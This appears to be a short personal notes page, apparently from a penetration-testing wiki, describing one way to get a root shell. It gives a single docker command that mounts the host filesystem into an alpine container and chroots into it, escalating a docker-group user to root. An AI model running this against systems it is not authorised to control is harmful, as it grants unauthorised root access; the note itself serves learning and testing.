# Pretext

Binary exploitation ways for you to get [[Termonology#Shell|Shell's]] as Root.

# # docker root shell

Below `alpine` is the image that is being remove to get the shell.
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```